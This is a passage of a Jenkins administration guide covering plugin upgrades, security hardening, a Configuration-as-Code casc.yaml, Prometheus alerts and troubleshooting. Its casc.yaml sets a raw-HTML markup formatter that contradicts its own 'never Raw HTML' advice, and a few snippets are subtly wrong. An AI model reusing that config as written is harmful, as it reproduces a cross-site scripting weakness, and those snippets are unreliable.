pipeline-utility-steps:2.18.0
milestone-step:80.v3c6a_a_f4d5b_b_0
build-timeout:1.33
naginator:1.240.v41b_f4f9b_7c6a
throttle-concurrents:2.15
rebuild:332.va_1ee476d8f6d
docker-workflow:583.vf0b_3a_25e4f2f
EOF

docker build -t ghcr.io/3558bhk/jenkins-shop:2026.09.1 .
docker push ghcr.io/3558bhk/jenkins-shop:2026.09.1

# 3. update values.yaml to use YOUR image
#    controller.image.repository: ghcr.io/3558bhk/jenkins-shop
#    controller.image.tag: "2026.09.1"
#    controller.installPlugins: []          ← ⭐ EMPTY, they're baked in

# 4. test in a throwaway namespace
helm upgrade --install jenkins-test jenkinsci/jenkins -n jenkins-test \
  --create-namespace --values values-test.yaml --wait
# run the full pipeline suite against it

# 5. ⭐ take a backup FIRST (§11.4), then roll
kubectl -n jenkins get sts jenkins -o yaml > backup-sts.yaml
helm upgrade --install jenkins jenkinsci/jenkins -n jenkins --values values.yaml \
  --wait --timeout 15m

# 6. verify
kubectl -n jenkins logs sts/jenkins -c jenkins | grep -iE 'SEVERE|Exception' | head -20
curl -sf https://jenkins.shop.example.com/login >/dev/null && echo "✅ up"
# ⭐ and run one build of every critical job

# ⭐ THE ROLLBACK
helm rollback jenkins <REVISION> -n jenkins --wait
helm history jenkins -n jenkins
```

### 7.5 The security settings to review monthly

```
Manage Jenkins → Security
  ┌──────────────────────────────────────────────────────────────────┐
  │ Security Realm:  ⭐ LDAP / SAML / OIDC (Google, Entra, Okta)     │
  │                  ⛔ NOT "Jenkins' own user database" in prod     │
  │                  ⛔⛔ NOT "Allow users to sign up"               │
  │                                                                  │
  │ Authorization:   ⭐ "Role-Based Strategy" or "Matrix-based"      │
  │                  ⛔ NOT "Anyone can do anything"                 │
  │                  ⛔ NOT "Logged-in users can do anything"        │
  │                                                                  │
  │ ⭐ Build Authorization (authorize-project):                      │
  │                  "Run as User who Triggered Build"               │
  │                                                                  │
  │ Agents:          ⭐ TCP port for inbound agents: a FIXED port    │
  │                    (50000), not random — so a NetworkPolicy works │
  │                  ⭐ "Agent → Controller Access Control":         │
  │                    ☑ ENABLED  ← ⛔⛔ THIS IS THE BIG ONE         │
  │                    Command → ⭐ reject everything except:        │
  │                      FilePath: only the workspace                │
  │                      (this stops a compromised agent from        │
  │                       reading arbitrary files on the controller) │
  │                                                                  │
  │ CSRF Protection: ☑ ENABLED  (never disable)                      │
  │                                                                  │
  │ CLI:             ⛔ "Enable CLI over HTTP" — OFF                 │
  │                  ⭐ "Enable CLI over Remoting" — OFF             │
  │                  CLI over SSH — ON, with keys                    │
  │                                                                  │
  │ Markup Formatter: ⭐ "Safe HTML" (antisamy) — never "Raw HTML"   │
  │                                                                  │
  │ Secret Management: ☑ Encrypt secrets in the build log            │
  │                    ⭐ the credentials plugin masks by default     │
  │                                                                  │
  │ Global Security → "Hidden" settings:                             │
  │  ⭐ Disable the Jenkins CLI entirely? (for a hardened install)   │
  │  ⭐ Disable the Script Console for non-admins (it already is,    │
  │     but verify: Overall/Administer is the ONLY way in)           │
  │  ⭐ DirectoryBrowserSupport.CSP — set it, or an HTML report can  │
  │     run arbitrary JS in your Jenkins origin                      │
  └──────────────────────────────────────────────────────────────────┘

Manage Jenkins → System → Jenkins Location
  ⭐ Jenkins URL: https://jenkins.shop.example.com   ← ⭐⭐ if wrong, every
                                                       email/link/notification breaks
  System Admin e-mail: jenkins-admins@shop.example.com

Manage Jenkins → Nodes → Built-In Node
  ⭐ # of executors: 0                                ← ⭐⭐ THE MOST IMPORTANT
  ⭐ Usage: "Leave this node for tied jobs only"
```

```groovy
// ⭐ the Script Console audit — run it monthly
import jenkins.model.Jenkins
import hudson.security.*

def j = Jenkins.instance
println "=== SECURITY AUDIT — ${new Date()} ==="

println "\n1. the built-in node executors (MUST be 0)"
println "   numExecutors = ${j.numExecutors}  ${j.numExecutors == 0 ? '✅' : '⛔⛔⛔ FIX THIS NOW'}"
println "   mode = ${j.mode}"

println "\n2. the authorization strategy"
println "   ${j.authorizationStrategy.getClass().name}"
if (j.authorizationStrategy instanceof hudson.security.AuthorizationStrategy.Unsecured) {
  println "   ⛔⛔⛔ 'Anyone can do anything' — CRITICAL"
}

println "\n3. the security realm"
println "   ${j.securityRealm.getClass().name}"
if (j.securityRealm instanceof HudsonPrivateSecurityRealm) {
  def realm = (HudsonPrivateSecurityRealm) j.securityRealm
  println "   allowsSignup = ${realm.allowsSignup}  ${realm.allowsSignup ? '⛔⛔⛔ open signup!' : '✅'}"
}

println "\n4. CSRF"
println "   ${j.crumbIssuer ? '✅ enabled' : '⛔ DISABLED'}"

println "\n5. the agent protocol"
def apc = j.getDescriptor('jenkins.security.AgentToControllerSecurityFilter')
println "   Agent→Controller access control: ${jenkins.security.s2m.AdminWhitelistRule.class ? 'check the UI' : '?'}"

println "\n6. plugins needing an update"
j.pluginManager.activePlugins.findAll { it.hasUpdate() }.each {
  println "   ⚠️  ${it.shortName} ${it.version} → ${it.updateInfo?.version}"
}

println "\n7. ⛔ deprecated/insecure plugins still installed"
j.pluginManager.activePlugins.findAll { it.isDeprecated() }.each {
  println "   ⛔ ${it.shortName} ${it.version}"
}

println "\n8. jobs running as SYSTEM (should be none)"
import org.jenkinsci.plugins.authorizeproject.*
Jenkins.instance.allItems(hudson.model.Job).each { job ->
  def strategy = job.getProperty(AuthorizeProjectProperty)?.strategy
  if (strategy == null || strategy instanceof SystemAuthorizationStrategy) {
    println "   ⛔ ${job.fullName}  → runs as SYSTEM"
  } else {
    println "   ✅ ${job.fullName}  → ${strategy.getClass().simpleName}"
  }
}

println "\n9. the Script Console's own reachability"
println "   (if you can run this, you have Overall/Administer — verify WHO does)"
j.getAllPermissionEntries?.each { } // (varies by auth strategy)

println "\n10. credentials inventory (IDs and scopes ONLY — never values)"
com.cloudbees.plugins.credentials.CredentialsProvider.lookupStores(j).each { store ->
  println "   store: ${store.getClass().simpleName} (${store.context})"
  store.credentials.each { c ->
    println "     ${c.id.padRight(35)} ${c.getClass().simpleName.padRight(35)} ${c.scope}"
  }
}
```

---

## 8 · JCasC — Jenkins Configuration as Code ⭐⭐

```yaml
# casc.yaml — ⭐⭐ THE ENTIRE CONTROLLER CONFIGURATION, IN GIT.
# This is what makes Jenkins reviewable, reproducible and recoverable.
# Docs: https://github.com/jenkinsci/configuration-as-code-plugin

jenkins:
  # ── the basics ────────────────────────────────────────────────
  systemMessage: |
    ⚠️ This Jenkins is managed as code. Changes made in the UI WILL BE OVERWRITTEN
       on the next reload. Edit https://github.com/3558Bhk/jenkins-config instead.
    Owner: platform-team@shop.example.com · #platform on Slack
  numExecutors: 0                        # ⭐⭐ ZERO. Never build on the controller.
  mode: EXCLUSIVE
  labelString: 'built-in'
  quietPeriod: 5
  scmCheckoutRetryCount: 2
  disableRememberMe: false
  rawBuildActivationQueueAdaptors: true
  projectNamingStrategy: 'standard'
  slaveAgentPort: 50000                  # ⭐ a FIXED port so a NetworkPolicy works
  markupFormatter:
    rawHtml:
      disableSyntaxHighlighting: false

  # ── the security realm ────────────────────────────────────────
  securityRealm:
    local:
      allowsSignup: false                # ⭐⭐ NEVER true in production
      users:
        - id: '${chart-admin-username}'
          password: '${chart-admin-password}'
    # ⭐ or LDAP:
    # ldap:
    #   configurations:
    #     - server: 'ldaps://dc.shop.example.com:636'
    #       rootDN: 'DC=shop,DC=example,DC=com'
    #       userSearchBase: 'OU=Users'
    #       userSearch: 'sAMAccountName={0}'
    #       groupSearchBase: 'OU=Groups'
    #       managerDN: 'CN=jenkins-svc,OU=Service,OU=Users,DC=shop,DC=example,DC=com'
    #       managerPasswordSecret: '${LDAP_BIND_PASSWORD}'
    #   disableMailAddressResolver: false
    #   groupIdStrategy: 'caseInsensitive'
    #   userIdStrategy: 'caseInsensitive'
    # ⭐ or OIDC (Google/Entra/Okta) via the oic-auth plugin:
    # oic:
    #   clientId: 'jenkins'
    #   clientSecret: '${OIDC_CLIENT_SECRET}'
    #   tokenServerUrl: 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token'
    #   authorizationServerUrl: 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/authorize'
    #   userInfoServerUrl: 'https://graph.microsoft.com/oidc/userinfo'
    #   jwksServerUrl: 'https://login.microsoftonline.com/<tenant>/discovery/v2.0/keys'
    #   userNameField: 'email'
    #   groupsFieldName: 'groups'
    #   scopes: 'openid profile email groups'
    #   emailFieldName: 'email'
    #   fullNameFieldName: 'name'
    #   escapeHatchEnabled: true               # ⭐ a break-glass local admin
    #   escapeHatchName: 'breakglass'
    #   escapeHatchSecret: '${ESCAPE_HATCH_SECRET}'

  # ── authorization ⭐⭐ ─────────────────────────────────────────
  authorizationStrategy:
    roleBased:
      roles:
        global:
          - name: 'admin'
            description: 'Full control'
            permissions: ['Overall/Administer']
            entries:
              - user: 'harish'
              - group: 'platform-team'
          - name: 'sre'
            permissions:
              - 'Overall/Read'
              - 'Job/Read'
              - 'Job/Build'
              - 'Job/Configure'
              - 'Job/Cancel'
              - 'Job/Workspace'
              - 'Run/Update'
              - 'Run/Delete'
              - 'View/Read'
              - 'View/Configure'
              - 'Credentials/View'
              - 'Credentials/Create'
            entries: [{group: 'sre-team'}]
          - name: 'developer'
            permissions:
              - 'Overall/Read'
              - 'Job/Read'
              - 'Job/Build'
              - 'Job/Cancel'
              - 'Job/Workspace'
              - 'View/Read'
            entries:
              - group: 'developers'
              - group: 'authenticated'          # ⭐ any logged-in user
          - name: 'readonly'
            permissions: ['Overall/Read', 'Job/Read', 'View/Read']
            entries: [{user: 'auditor'}]
        # ⭐⭐ PROJECT (folder) ROLES — this is the fine-grained part
        project:
          - name: 'production-deployer'
            description: 'May build and configure jobs in shop/production/'
            pattern: 'shop/production/.*'        # ⭐ a regex on the job's full name
            permissions:
              - 'Job/Build'
              - 'Job/Configure'
              - 'Job/Cancel'
              - 'Credentials/Use'
            entries: [{group: 'sre-team'}]
          - name: 'shop-developer'
            pattern: 'shop/.*'
            permissions: ['Job/Read', 'Job/Build', 'Job/Cancel', 'Job/Workspace']
            entries: [{group: 'developers'}]
        # ⭐ AGENT (slave) roles
        slave:
          - name: 'agent-admin'
            permissions: ['Agent/Configure', 'Agent/Disconnect', 'Agent/Connect', 'Agent/Delete']
            entries: [{group: 'platform-team'}]

  # ── ⭐⭐ the build authorization strategy (the identity fix) ───
  # (from the authorize-project plugin — set per-folder or globally)
  # global:
  #   authorizeProject:
  #     strategy: 'triggeringUsersAuthorizationStrategy'   # ⭐ run as the triggerer

  # ── the remoting security ⭐⭐ ─────────────────────────────────
  remotingSecurity:
    enabled: true                        # ⛔ NEVER false

  # ── the clouds ⭐⭐ ────────────────────────────────────────────
  clouds:
    - kubernetes:
        name: 'kubernetes'
        serverUrl: 'https://kubernetes.default'
        namespace: 'jenkins'
        credentialsId: 'kubernetes-cloud-sa'
        jenkinsUrl: 'http://jenkins.jenkins.svc.cluster.local:8080'
        jenkinsTunnel: 'jenkins-agent.jenkins.svc.cluster.local:50000'
        containerCapStr: '50'
        maxRequestsPerHostStr: '32'
        retentionTimeout: 300
        waitForPodSec: 600
        connectTimeout: 10
        readTimeout: 20
        restrictKubernetesCloudsToFolder: true     # ⭐⭐ folder isolation
        garbageCollection: {timeout: 300}
        templates:
          - name: 'shop-base'
            namespace: 'jenkins'
            label: 'shop linux'
            nodeUsageMode: EXCLUSIVE
            nodeSelector: 'kubernetes.io/os=linux'
            serviceAccount: 'jenkins-agent'
            instanceCap: 20
            idleMinutes: 0                          # ⭐⭐ destroy when idle
            podRetention: never                     # ⭐⭐ never keep a pod
            activeDeadlineSeconds: 900
            containers:
              - name: 'jnlp'
                image: 'jenkins/inbound-agent:3313.vf6a_8b_1f0c4d1-1-jdk21'
                alwaysPullImage: true               # ⭐⭐ never a stale image
                workingDir: '/home/jenkins/agent'
                privileged: false                   # ⭐⭐ NEVER true
                runAsUser: 1000
                runAsGroup: 1000
                ttyEnabled: true
                resourceRequestCpu: '250m'
                resourceRequestMemory: '512Mi'
                resourceLimitCpu: '1'
                resourceLimitMemory: '2Gi'
              - name: 'java'
                image: 'eclipse-temurin:21-jdk-jammy'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false
                resourceRequestCpu: '500m'
                resourceRequestMemory: '1Gi'
                resourceLimitCpu: '2'
                resourceLimitMemory: '4Gi'
              - name: 'tools'
                image: 'alpine/helm:3.16.2'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false
              - name: 'kaniko'
                image: 'gcr.io/kaniko-project/executor:v1.23.2-debug'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false                   # ⭐⭐ kaniko needs no privileges
            volumes:
              - emptyDirVolume:
                  mountPath: '/home/jenkins/agent/workspace'
                  memory: false
                  sizeLimit: '10Gi'
            workspaceVolume:
              emptyDirWorkspaceVolume: {memory: false}
            annotations:
              - podAnnotation: {key: 'shop.example.com/purpose', value: 'ci-agent'}
          - name: 'shop-gpu'
            inheritFrom: 'shop-base'
            label: 'shop gpu e2e'
            nodeUsageMode: EXCLUSIVE
            instanceCap: 2                          # ⭐ expensive → capped
            nodeSelector: 'nvidia.com/gpu=present'
            containers:
              - name: 'playwright'
                image: 'mcr.microsoft.com/playwright:v1.49.0-jammy'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false
                resourceLimitCpu: '4'
                resourceLimitMemory: '8Gi'

  # ── the global nodes (a static VM agent, if you have one) ─────
  nodes: []                         # ⭐ prefer clouds; a static node is state you must patch

  # ── the global tools ⭐ ───────────────────────────────────────
  # (mostly irrelevant when every build runs in a container with the tool baked in)

  # ── the quiet period, the cron ────────────────────────────────
  crumbIssuer:
    standard:
      excludeClientIPFromCrumb: true     # ⭐ needed behind a load balancer

# ═══════════════════════════════════════════════════════════════════
unclassified:
  # ── the Jenkins URL ⭐⭐ ───────────────────────────────────────
  location:
    adminAddress: 'jenkins-admins@shop.example.com'
    url: 'https://jenkins.shop.example.com/'

  # ── the build discarder defaults ──────────────────────────────
  buildStepOperation:
    enabled: true

  # ── ⭐ Prometheus metrics ─────────────────────────────────────
  prometheusConfiguration:
    path: 'prometheus'
    useAuthenticatedEndpoint: true        # ⭐ don't expose metrics anonymously
    countAbortBuilds: true
    countUnstableBuilds: true
    countStatus: true
    appendParamLabel: true
    appendStatusLabel: true
    processingThreads: 5

  # ── the audit trail ⭐⭐ ───────────────────────────────────────
  audit-trail:
    logBuildCauses: true
    pattern: '(/computer/[^/]+)/(configure|delete)|(view/[^/]+/)|(job/[^/]+/[^/]+/build)|(scriptText/)'
    separator: '|'
    log:
      loggers:
        - logFile:
            log: '/var/jenkins_home/logs/audit.log'
            limit: 10                       # ⭐ 10 files
            count: 50                       # ⭐ 50 MB each
            logBuildCauses: true
            logBuildCausesMap: {userId: true, userName: true}

  # ── the GitHub plugin ─────────────────────────────────────────
  githubPluginConfig:
    configs:
      - name: 'shop'
        apiUrl: 'https://api.github.com'
        credentialsId: 'github-bot'
        manageHooks: true                    # ⭐ Jenkins manages the repo webhooks

  # ── the Git plugin ────────────────────────────────────────────
  gitSCM:
    createAccountBasedOnEmail: false
    useExistingAccountWithSameEmail: false
    showEntireCommitSummaryInChanges: true
    globalConfigName: 'shop-ci'
    globalConfigEmail: 'shop-ci@shop.example.com'

  # ── the Lockable Resources ────────────────────────────────────
  lockableResourcesStruct:
    resources:
      - name: 'deploy-production'
        description: '⭐ The production deploy mutex'
        labels: 'deploy,production'
        reservedBy: ''
      - name: 'deploy-staging'
        labels: 'deploy,staging'
      - name: 'shop-database-migration'
        description: 'A DB migration and a deploy must not interleave'
        labels: 'database'
      - name: 'gpu-runner'
        labels: 'gpu'
        quantity: 4                          # ⭐ a pool of 4 slots
    reserveScript: ''
    unreserveScript: ''

  # ── the Throttle Concurrent Builds defaults ───────────────────
  throttleConcurrents:
    categories:
      - categoryName: 'deploys'
        maxConcurrentTotal: 2
        maxConcurrentPerNode: 1

  # ── the email extension ───────────────────────────────────────
  mailer:
    adminAddress: 'jenkins-admins@shop.example.com'
    useSsl: true
    smtpHost: 'smtp.shop.example.com'
    smtpPort: 587
    credentialsId: 'smtp-credentials'

  # ── ⭐ the job config history (the audit trail for config changes)
  jobConfigHistory:
    maxEntriesPerPage: 20
    maxDaysToStoreEntries: 180
    maxHistoryEntries: 500
    saveModuleConfiguration: true
    showBuildBadges: always
    skippedModules: ''
    excludedUsers: 'system'

# ═══════════════════════════════════════════════════════════════════
security:
  # ⭐⭐ the Script Console / CLI / remoting hardening
  globalJobDslSecurityConfiguration:
    useScriptSecurity: true               # ⛔ NEVER false — Job DSL would run unsandboxed
  scriptApproval:
    approvedSignatures: []                # ⭐ EMPTY. Approve via the UI, or list them here
                                          #    deliberately, with a comment per line.
  apiToken:
    creationOfLegacyTokenEnabled: false    # ⭐⭐ no legacy tokens
    usageStatisticsEnabled: true
    tokenGenerationOnCreationEnabled: false
  # ⭐ the s2m (agent → controller) security
  # globalJobDslSecurityConfiguration and:
  # remotingSecurity: {enabled: true}

# ═══════════════════════════════════════════════════════════════════
# ⭐⭐ SECRETS IN JCasC — never inline
# JCasC supports ${VAR} substitution from:
#   · environment variables
#   · files:  ${file:/var/jenkins_home/secrets/x}
#   · secrets: ${secret:my-key}
#   · the Kubernetes secret mounted into the pod (the Helm chart does this)
credentials:
  system:
    domainCredentials:
      - credentials:
          - usernamePassword:
              scope: SYSTEM                       # ⭐ SYSTEM = Jenkins itself, not jobs
              id: 'kubernetes-cloud-sa'
              description: 'The service account the controller uses to create agent pods'
              username: 'jenkins'
              password: '${K8S_SA_TOKEN}'
          - string:
              scope: SYSTEM
              id: 'smtp-credentials-password'
              secret: '${SMTP_PASSWORD}'

# ═══════════════════════════════════════════════════════════════════
# ⭐⭐ JOBS AS CODE — the seed job
jobs:
  - script: >
      folder('shop') {
        displayName('🛒 shop')
        description('Managed by JCasC — do not edit in the UI')
      }
  - script: >
      folder('shop/production') {
        displayName('🚀 production')
      }
  # ⭐ or read the DSL from files:
  - file: '/var/jenkins_home/jobs/*.groovy'
  # ⭐ or a seed job that manages everything else:
  - script: >
      pipelineJob('seed') {
        definition {
          cpsScm {
            scm { git {
              remote { url('https://github.com/3558Bhk/jenkins-config.git')
                       credentials('github-bot') }
              branches('*/main')
            }}
            scriptPath('jobs/seed.Jenkinsfile')
          }
        }
        triggers { scm('H/5 * * * *') }
      }

# ═══════════════════════════════════════════════════════════════════
tool:
  git:
    installations:
      - name: 'Default'
        home: 'git'
  jdk:
    installations:
      - name: 'jdk21'
        home: '/opt/java/openjdk'
  maven:
    installations:
      - name: 'maven-3.9'
        properties:
          - installSource:
              installers:
                - maven: {id: '3.9.9'}
```

```bash
# ⭐ validate, reload and diff the JCasC config
# 1. VALIDATE before applying — the plugin has an endpoint
curl -s -u admin:$TOKEN -XPOST \
  "https://jenkins.shop.example.com/configuration-as-code/check" \
  --data-binary @casc.yaml
# → a report of every unknown/invalid key, with line numbers. ⭐ RUN THIS IN CI.

# 2. view the CURRENT effective config
curl -s -u admin:$TOKEN \
  "https://jenkins.shop.example.com/configuration-as-code/view" > current-casc.yaml

# 3. ⭐ DIFF what's in Git against what's live — find UI drift
curl -s -u admin:$TOKEN "https://jenkins.shop.example.com/configuration-as-code/export" \
  > live-casc.yaml
diff -u casc.yaml live-casc.yaml | head -50
# ⭐ anything in `live` that isn't in `casc.yaml` is a UI change that will be
#    LOST on the next reload — either commit it or revert it.

# 4. reload
curl -s -u admin:$TOKEN -XPOST \
  "https://jenkins.shop.example.com/configuration-as-code/reload"
# or in the pod:
kubectl -n jenkins exec sts/jenkins -c jenkins -- \
  java -jar /usr/share/jenkins/jenkins-cli.jar -s http://localhost:8080 reload-jcasc-configuration

# 5. ⭐ and make the validation part of the config repo's CI
# .github/workflows/validate-casc.yml
#   - run: |
#       docker run --rm -v "$PWD:/cfg" -e CASC_JENKINS_CONFIG=/cfg/casc.yaml \
#         jenkins/jenkins:2.568.3-lts \
#         java -jar /usr/share/jenkins/jenkins.war --httpPort=-1 \
#              --argumentsRealm.roles.admin=admin \
#              -Djenkins.install.runSetupWizard=false &
#       sleep 60; curl -sf localhost:8080/configuration-as-code/view >/dev/null && echo "✅ valid"
```

---

## 9 · Observability of Jenkins itself

```bash
# ⭐ the Prometheus plugin gives you /prometheus
curl -s -u admin:$TOKEN https://jenkins.shop.example.com/prometheus | head -40

# the metrics that matter
jenkins_builds_duration_milliseconds_summary{quantile="0.5", job="shop/main"}   142000
jenkins_builds_duration_milliseconds_summary{quantile="0.99", …}                 1840000
jenkins_builds_total{job="shop/main",result="success",status="last"}             1
jenkins_builds_success_total{…}                                                  4211
jenkins_builds_failure_total{…}                                                   312
jenkins_builds_unstable_total{…}                                                   87
jenkins_builds_aborted_total{…}                                                     9
jenkins_node_online_value{node="shop-47-abc"}                                      1
jenkins_node_offline_value                                                          0
jenkins_executor_free_value                                                        14
jenkins_executor_in_use_value                                                       6
jenkins_queue_size_value                                                            2      ⭐ > 0 sustained = you need agents
jenkins_queue_blocked_value                                                         0      ⭐ > 0 = a lock/dependency is stuck
jenkins_plugins_failed_value                                                        0      ⭐ MUST be 0
jenkins_plugins_inactive_value                                                      0
jenkins_health_check_value                                                          1
jenkins_jvm_memory_used_bytes                                                       …
jenkins_jvm_gc_time_milliseconds                                                    …      ⭐ GC pauses = too small a heap
```

```yaml
# ⭐ scrape it from the Prometheus in the monitoring learning path
# k8s/monitoring/jenkins-servicemonitor.yaml
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: jenkins
  namespace: monitoring
  labels: {release: kps}
spec:
  namespaceSelector: {names: [jenkins]}
  selector:
    matchLabels: {app.kubernetes.io/name: jenkins}
  endpoints:
    - port: http
      path: /prometheus
      interval: 60s
      scrapeTimeout: 30s
      basicAuth:
        username: {name: jenkins-metrics, key: user}
        password: {name: jenkins-metrics, key: token}
```

```yaml
# ⭐ and the ALERTS that matter — from the monitoring path's conventions
groups:
  - name: jenkins.rules
    rules:
      # ── tier 4: the CI platform IS infrastructure ────────────────
      - alert: JenkinsDown
        expr: up{job="jenkins"} == 0
        for: 3m
        labels: {severity: critical, team: observability, tier: '4'}
        annotations:
          summary: Jenkins is down
          description: 'No metrics from Jenkins for 3 minutes. CI/CD is unavailable — nobody can deploy.'
          runbook: https://runbooks.shop.example.com/jenkins/down

      - alert: JenkinsQueueBacklog
        expr: jenkins_queue_size_value > 10
        for: 10m
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: The Jenkins build queue has {{ $value }} items
          description: 'Builders are not keeping up. Check containerCap, node capacity and instanceCap.'

      - alert: JenkinsQueueBlocked
        expr: jenkins_queue_blocked_value > 0
        for: 15m
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: '{{ $value }} build(s) are BLOCKED in the Jenkins queue'
          description: >
            Blocked usually means waiting for a lock or an `input` approval.
            A blocked build holds resources indefinitely. Check the Lockable
            Resources page and any pending approvals older than 8 hours.

      - alert: JenkinsAgentPodsFailing
        expr: kube_pod_status_phase{namespace="jenkins",phase="Pending"} > 5
        for: 10m
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: '{{ $value }} Jenkins agent pods are Pending'

      - alert: JenkinsBuildFailureRateHigh
        expr: |
          sum(rate(jenkins_builds_failure_total[1h]))
            / clamp_min(sum(rate(jenkins_builds_total[1h])), 0.001) > 0.25
        for: 30m
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: '{{ $value | humanizePercentage }} of Jenkins builds are failing'
          description: >
            A sustained failure rate above 25% usually means a broken shared
            library, a stale base image, or a dependency outage — not 100
            independent bugs. Check the most recent library release first.

      - alert: JenkinsBuildsTakingTooLong
        expr: jenkins_builds_duration_milliseconds_summary{quantile="0.95"} > 3600000
        for: 1h
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: 'the p95 Jenkins build duration is {{ $value | humanizeDuration }}'

      - alert: JenkinsPluginsFailed
        expr: jenkins_plugins_failed_value > 0
        for: 5m
        labels: {severity: critical, team: platform, tier: '4'}
        annotations:
          summary: '{{ $value }} Jenkins plugin(s) failed to load'
          description: 'A failed plugin can silently disable steps. Check the startup log.'

      - alert: JenkinsControllerHeapHigh
        expr: |
          jenkins_jvm_memory_used_bytes{area="heap"}
            / jenkins_jvm_memory_max_bytes{area="heap"} > 0.85
        for: 15m
        labels: {severity: warning, team: platform, tier: '4'}
        annotations:
          summary: 'the Jenkins controller heap is at {{ $value | humanizePercentage }}'

      - alert: JenkinsDiskAlmostFull
        expr: |
          kubelet_volume_stats_available_bytes{namespace="jenkins",persistentvolumeclaim=~".*jenkins.*"}
            / kubelet_volume_stats_capacity_bytes{namespace="jenkins",persistentvolumeclaim=~".*jenkins.*"} < 0.15
        for: 10m
        labels: {severity: critical, team: platform, tier: '4'}
        annotations:
          summary: 'JENKINS_HOME is {{ $value | humanizePercentage }} full'
          description: >
            Jenkins corrupts its state when the disk fills. Expand the PVC or
            tighten the build discarder NOW.

      # ⭐ the DORA metrics, straight from Jenkins
      - alert: DeploymentFrequencyDropped
        expr: |
          sum(increase(jenkins_deploy_total{environment="production"}[7d])) < 5
        for: 1h
        labels: {severity: info, team: platform}
        annotations:
          summary: 'fewer than 5 production deployments in the last 7 days'
```

```yaml
# ⭐ the Grafana dashboard — the four panels that matter
# grafana/dashboards/jenkins.json (abbreviated)
panels:
  - title: 🚦 Build results (24h)
    type: bargauge
    targets:
      - expr: sum by (result) (increase(jenkins_builds_total{job=~"$job"}[24h]))
        legendFormat: '{{result}}'
  - title: ⏱️ Build duration percentiles
    type: timeseries
    targets:
      - expr: jenkins_builds_duration_milliseconds_summary{job=~"$job",quantile="0.5"} / 60000
        legendFormat: p50
      - expr: jenkins_builds_duration_milliseconds_summary{job=~"$job",quantile="0.95"} / 60000
        legendFormat: p95
      - expr: jenkins_builds_duration_milliseconds_summary{job=~"$job",quantile="0.99"} / 60000
        legendFormat: p99
  - title: 🏗️ Agent pods (live)
    type: stat
    targets:
      - expr: count(kube_pod_info{namespace="jenkins",pod=~"shop-.*"})
  - title: 📋 Queue depth
    type: timeseries
    targets:
      - expr: jenkins_queue_size_value
        legendFormat: queued
      - expr: jenkins_queue_blocked_value
        legendFormat: blocked
  - title: 🚀 Production deployments (DORA)
    type: stat
    targets:
      - expr: sum(increase(jenkins_deploy_total{environment="production"}[30d]))
        legendFormat: deploys / 30d
```

---

## 10 · Troubleshooting — the failures that actually happen

### 10.1 The build hangs or never starts

```bash
# ⭐ the diagnostic ORDER
# 1. is it in the QUEUE or RUNNING?
ssh -p 50000 admin@jenkins list-queue
curl -s -u admin:$TOKEN "$JENKINS_URL/queue/api/json?tree=items[task[name],why,inQueueSince,blocked,buildable,stuck]" | jq

# 2. the queue reason tells you everything
#  "Waiting for next available executor on 'shop-47-abc'"     → no agent capacity
#  "Build #46 is already in progress (job has disableConcurrentBuilds)" → the mutex
#  "Waiting for resource: deploy-production"                  → ⭐ a LOCK is held
#  "Blocked by milestone"                                     → a newer build superseded it
#  "In the quiet period (5s)"                                 → normal
#  "Waiting for the Jenkinsfile to be fetched"                → an SCM problem
#  "Build is scheduled but no agent matches label 'xyz'"      → ⭐ a label typo
#  "Project 'x' is disabled"                                  → someone disabled the job

# 3. is there an agent?
kubectl -n jenkins get pods -l jenkins/label
curl -s -u admin:$TOKEN "$JENKINS_URL/computer/api/json?tree=computer[displayName,offline,temporarilyOffline,numExecutors,idle]" | jq

# 4. is a lock stuck?
#    Manage Jenkins → Lockable Resources → is something reserved by a DEAD build?
curl -s -u admin:$TOKEN "$JENKINS_URL/lockable-resources/api/json" | jq '.resources[] | {name, reservedBy, lockedBy, buildName}'
#    → "Reserve" / "Unreserve" / "Reset" from the UI, or:
```

```groovy
// ⭐ force-release every lock held by a build that no longer exists
import org.jenkins.plugins.lockableresources.LockableResourcesManager
def mgr = LockableResourcesManager.get()
mgr.resources.each { r ->
  if (r.isLocked() || r.isReserved()) {
    def build = r.getBuild()
    if (build == null || !build.isBuilding()) {
      println "  releasing ${r.name} (held by ${r.buildName ?: 'nothing'})"
      r.setBuild(null); r.setReservedBy(null); r.reset()
    } else {
      println "  ${r.name} is legitimately held by ${build.fullDisplayName}"
    }
  }
}
mgr.save()
println "  ✅ done"
```

### 10.2 The Groovy / sandbox errors

```
⛔ "Scripts not permitted to use method X"
   → the sandbox blocked it. Manage Jenkins → In-process Script Approval.
   ⭐ BEFORE approving globally, check: can you do it another way?
   ⭐ or put it in the shared library (trusted, unsandboxed, reviewed).

⛔ "java.io.NotSerializableException: groovy.json.internal.LazyMap"
   → ⭐⭐ THE MOST COMMON GROOVY ERROR IN JENKINS.
   → Jenkins checkpoints the pipeline state to disk BETWEEN steps (CPS).
     A JsonSlurper result, a Matcher, a Socket, a Connection are NOT serializable.
   → FIX A: wrap the logic in a @NonCPS method
        @NonCPS def parse(String s) { new groovy.json.JsonSlurper().parseText(s) }
   → FIX B: convert to a plain Map/List immediately and don't hold the object
        def m = [:]; parsed.each { k, v -> m[k] = v.toString() }
   → FIX C: scope the object inside a single `script {}` block with NO steps in between
        ⛔ a `sh` step between the JsonSlurper and its last use = a checkpoint = a crash

⛔ "expected to run in the context of a node"
   → you used a `sh`/`readFile`/`stash` step outside a `node`/`agent` block.
   → FIX: wrap in `node('label') { … }` or give the stage an `agent`.

⛔ "Method calls on objects not allowed outside 'script'"
   → in DECLARATIVE, Groovy expressions must be inside `script { }`.
   → FIX: `steps { script { def x = computeThing() } }`

⛔ "WorkflowScript: 12: expecting '}', found 'X'"
   → a Groovy syntax error. Jenkins reports the LINE in the Jenkinsfile.
   ⭐ the Blue Ocean editor highlights these BEFORE you commit.
